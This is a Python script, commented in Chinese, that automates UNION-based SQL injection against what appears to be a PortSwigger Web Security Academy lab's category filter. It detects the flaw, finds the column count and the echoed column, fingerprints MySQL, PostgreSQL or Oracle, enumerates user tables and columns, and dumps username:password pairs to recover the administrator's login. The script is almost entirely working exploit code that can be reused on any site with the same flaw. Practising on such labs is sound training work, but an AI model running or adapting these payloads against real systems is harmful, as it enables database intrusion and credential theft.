import re
import requests
from typing import List, Optional, Tuple

BASE_URL = "https://0ab40035031acfee837af07600ba00d1.web-security-academy.net/filter"
PARAM_NAME = "category"
TIMEOUT = 10

session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (SQLi Tester)"})

COMMENT = "-- "  # 通用註解

def send_request(payload: str) -> Optional[requests.Response]:
    """發送測試請求"""
    print(f"    [Payload] {payload}")
    try:
        return session.get(BASE_URL, params={PARAM_NAME: payload}, timeout=TIMEOUT)
    except requests.RequestException as e:
        print(f"[!] Request error: {e}")
        return None

def detect_sqli() -> bool:
    print("[*] 偵測 SQLi")
    normal_payload = "Gifts"
    sqli_payload = f"' OR 1=1 {COMMENT}"
    normal_resp = send_request(normal_payload)
    sqli_resp = send_request(sqli_payload)
    if not normal_resp or not sqli_resp:
        return False
    if sqli_resp.status_code == 200 and len(sqli_resp.text) > len(normal_resp.text):
        print("[+] 目標可能存在 SQLi")
        return True
    print("[-] 未偵測到 SQLi")
    return False

def find_columns(max_columns: int = 20) -> Optional[int]:
    print("[*] 偵測欄位數")
    for num in range(1, max_columns + 1):
        payload = "' UNION SELECT " + ",".join(["NULL"] * num)  + f" {COMMENT} "
        resp = send_request(payload)
        if resp and resp.status_code == 200 and "error" not in resp.text.lower():
            print(f"[+] 欄位數 = {num}")
            return num
    return None

def find_display_column(num_cols: int) -> Optional[int]:
    print("[*] 偵測可回顯欄位")
    for i in range(1, num_cols + 1):
        vals = ["NULL"] * num_cols
        vals[i - 1] = "'DISP_COL_TEST'"
        payload = f"' UNION SELECT {','.join(vals)}{COMMENT}"
        resp = send_request(payload)
        if resp and "DISP_COL_TEST" in resp.text:
            print(f"[+] 可回顯欄位索引 = {i}")
            return i
    return None

def build_union(num_cols: int, disp_idx: int, expression: str, tail_from: str = "") -> str:
    vals = ["NULL"] * num_cols
    vals[disp_idx - 1] = expression
    return f"' UNION SELECT {','.join(vals)}{tail_from} {COMMENT}"

def try_detect_dbms(num_cols: int, disp_idx: int) -> Tuple[Optional[str], Optional[str]]:
    print("[*] 偵測 DBMS")
    tests = {
        "mysql": build_union(num_cols, disp_idx, "@@version"),
        "postgres": build_union(num_cols, disp_idx, "version()"),
        "oracle": build_union(num_cols, disp_idx, "banner", " FROM v$version"),
    }
    for dbms, payload in tests.items():
        r = send_request(payload)
        if not r: 
            continue
        text = r.text.lower()
        if dbms == "mysql" and "mysql" in text:
            print("[+] DBMS = MySQL/MariaDB")
            return dbms, r.text
        if dbms == "postgres" and "postgresql" in text:
            print("[+] DBMS = PostgreSQL")
            return dbms, r.text
        if dbms == "oracle" and "oracle" in text:
            print("[+] DBMS = Oracle")
            return dbms, r.text
    return None, None

def _html_to_lines(html: str):
    # 把易視為分行的標籤換成換行，其他標籤移除，再切行
    x = re.sub(r"(?i)<\s*br\s*/?\s*>", "\n", html)
    x = re.sub(r"(?i)</?(p|tr|td|li|div|span|pre|code|h\d)[^>]*>", "\n", x)
    x = re.sub(r"<[^>]+>", "", x)  # 去掉其餘標籤
    lines = [ln.strip() for ln in x.splitlines() if ln.strip()]
    return lines

def dump_version(num_cols: int, disp_idx: int, dbms: str):
    print("[*] 取得 DB 版本")
    if dbms == "mysql":
        payload = build_union(num_cols, disp_idx, "@@version")
    elif dbms == "postgres":
        payload = build_union(num_cols, disp_idx, "version()")
    elif dbms == "oracle":
        payload = build_union(num_cols, disp_idx, "banner", " FROM v$version")
    else:
        print("[-] 未知 DBMS，略過版本輸出")
        return

    r = send_request(payload)
    if not r or r.status_code != 200:
        print("[-] 無法取得版本資訊")
        return

    lines = _html_to_lines(r.text)

    if dbms == "postgres":
        # 直接回傳含 PostgreSQL 的整行 → e.g.
        # "PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"
        for ln in lines:
            if "PostgreSQL" in ln:
                print(f"[+] DB Version = {ln}")
                return

    elif dbms == "oracle":
        # 取含 Oracle Database 的整行（通常是 banner 其中一列）
        for ln in lines:
            if "Oracle" in ln and "Database" in ln:
                print(f"[+] DB Version = {ln}")
                return

    elif dbms == "mysql":
        # 先找包含 MySQL/MariaDB 的整行；找不到再退回純版本號
        for ln in lines:
            if "MySQL" in ln or "MariaDB" in ln:
                print(f"[+] DB Version = {ln}")
                return
        m = re.search(r"\b\d+\.\d+\.\d+(?:-[A-Za-z0-9._-]+)?\b", " ".join(lines))
        if m:
            print(f"[+] DB Version = {m.group(0)}")
            return

    # 落空時給一小段片段以利除錯（仍避免整頁）
    print("[?] 無法準確抽取版本字串，回應片段：", " ".join(lines)[:200])


def list_user_like_tables(num_cols: int, disp_idx: int, dbms: str) -> List[str]:
    print("[*] 搜尋 user-like 資料表")
    if dbms == "mysql":
        expr, tail = "table_name", (
            " FROM information_schema.tables WHERE LOWER(table_name) LIKE '%user%' "
            "AND table_schema NOT IN ('information_schema','mysql','performance_schema','sys')")
    elif dbms == "postgres":
        expr, tail = "table_name", (
            " FROM information_schema.tables WHERE LOWER(table_name) LIKE '%user%' "
            "AND table_schema NOT IN ('information_schema','pg_catalog')")
    elif dbms == "oracle":
        expr, tail = "table_name", " FROM all_tables WHERE LOWER(table_name) LIKE '%user%'"
    else:
        return []
    payload = build_union(num_cols, disp_idx, expr, tail)
    r = send_request(payload)
    if not r: return []
    candidates = re.findall(r"\b[a-zA-Z0-9_]{3,}\b", r.text)
    tables = sorted({c for c in candidates if "user" in c.lower()})
    if tables:
        print(f"[+] 找到表：{tables}")
    return tables

def list_columns(num_cols: int, disp_idx: int, dbms: str, table: str) -> List[str]:
    print(f"[*] 抓取 {table} 欄位")
    if dbms in ("mysql", "postgres"):
        expr, tail = "column_name", f" FROM information_schema.columns WHERE table_name='{table}'"
    elif dbms == "oracle":
        expr, tail = "column_name", f" FROM all_tab_columns WHERE table_name='{table.upper()}'"
    else:
        return []
    payload = build_union(num_cols, disp_idx, expr, tail)
    r = send_request(payload)
    if not r: return []
    cols = sorted(set(re.findall(r"\b[a-zA-Z0-9_]{2,}\b", r.text)))
    return cols

def dump_credentials(num_cols: int, disp_idx: int, dbms: str,
                     table: str, user_col: str, pass_col: str):
    if dbms == "mysql":
        expr = f"concat({user_col}, ':', {pass_col})"
        tail = f" FROM {table}"
    elif dbms == "postgres":
        expr = f"({user_col}::text || ':' || {pass_col}::text)"
        tail = f" FROM {table}"
    elif dbms == "oracle":
        expr = f"({user_col} || ':' || {pass_col})"
        tail = f" FROM {table.upper()}"
    else:
        print("[!] 未知 DBMS，略過 dump")
        return

    payload = build_union(num_cols, disp_idx, expr, tail)
    r = send_request(payload)
    if not r or r.status_code != 200:
        print(f"[-] 從 {table} dump 失敗")
        return

    # 嘗試找出形如 user:pass 的字串
    creds = re.findall(r"([a-zA-Z0-9_\.\-@]+):([^\s<>'\"]+)", r.text)
    found = False
    for u, p in creds:
        if u.lower() == "administrator":
            print(f"[+] 找到 administrator 帳密 → {u}:{p}")
            found = True
    if not found:
        print(f"[-] {table} 中未找到 administrator 資料（共擷取 {len(creds)} 筆）")


def guess_user_pass_columns(columns: List[str]) -> Tuple[Optional[str], Optional[str]]:
    # 常見命名關鍵字：user, username, login, email, mail；pass, password, passwd, hash
    user_keys = ["username", "user_name", "user", "login", "email", "mail"]
    pass_keys = ["password", "passwd", "pass", "pwd", "hash"]
    lc = [c.lower() for c in columns]
    user_col = None
    pass_col = None
    for key in user_keys:
        for i, c in enumerate(lc):
            if key == c or (key in c and len(c) <= 32):
                user_col = columns[i]
                break
        if user_col:
            break
    for key in pass_keys:
        for i, c in enumerate(lc):
            if key == c or (key in c and len(c) <= 32):
                pass_col = columns[i]
                break
        if pass_col:
            break
    return user_col, pass_col

if __name__ == "__main__":
    if not detect_sqli(): exit(0)
    col_cnt = find_columns()
    if not col_cnt: exit(0)
    disp_idx = find_display_column(col_cnt)
    if not disp_idx: exit(0)
    dbms, _ = try_detect_dbms(col_cnt, disp_idx)
    if not dbms: dbms = "mysql"
    dump_version(col_cnt, disp_idx, dbms)
    tables = list_user_like_tables(col_cnt, disp_idx, dbms)
    for t in tables:
        cols = list_columns(col_cnt, disp_idx, dbms, t)
        ucol, pcol = guess_user_pass_columns(cols)
        if ucol and pcol:
            dump_credentials(col_cnt, disp_idx, dbms, t, ucol, pcol)
